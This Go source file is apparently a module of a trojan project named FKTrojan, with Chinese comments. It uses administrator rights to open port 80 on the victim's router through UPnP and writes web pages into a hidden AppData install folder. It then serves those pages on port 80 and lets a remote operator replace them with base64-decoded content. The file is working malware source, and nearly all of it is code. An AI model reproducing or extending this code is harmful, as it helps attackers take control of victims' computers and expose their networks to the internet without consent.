/*
Author: FreeKnight
启动一个web服务器
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"errors"
	"net/http"
	"os"
)

//------------------------------------------------------------
// 启动一个80端口的web服务器
func startWebServer() (string, error) {
	if !isAdmin {
		return "", errors.New("Web server must be Admin.") // 不是管理员玩不起来的
	}

	_, err := openPort(80) // 尝试开启UPnp的80端口
	if err != nil {
		return "", err
	}

	// 整个文件夹
	err = os.MkdirAll(tmpAppDataInstallDir+"srv\\", os.FileMode(544))
	if err != nil {
		return "", err
	}

	// 造一个网页
	n_html, err1 := os.Create(tmpAppDataInstallDir + "srv\\" + "index.html")
	if err1 != nil {
		return "", err1
	}
	_, err1 = n_html.WriteString(rawHTMLPage)
	if err1 != nil {
		return "", err1
	}
	err1 = n_html.Close()
	if err1 != nil {
		return "", err1
	}

	// 开启web服务器
	go srvHandle()

	return "Start web server successed.", nil
}

//------------------------------------------------------------
// 修改一下页面
func editPage(name string, html string) (string, error) {
	// 删除旧页
	err := deleteFile(tmpAppDataInstallDir + "srv\\" + name)
	if err != nil {
		return "", err
	}
	// 创建一个新页
	n_html, err1 := os.Create(tmpAppDataInstallDir + "srv\\" + name)
	if err1 != nil {
		return "", err1
	}
	_, err = n_html.WriteString(common.Base64Decode(html))
	if err != nil {
		return "", err
	}
	err = n_html.Close()
	if err != nil {
		return "", err
	}
	return "Edit page successed", nil
}

//------------------------------------------------------------
func srvHandle() {
	FKDebugLog("Hosting Webserver.")
	http.ListenAndServe(":80", http.FileServer(http.Dir(tmpAppDataInstallDir+"srv/")))
}

//------------------------------------------------------------
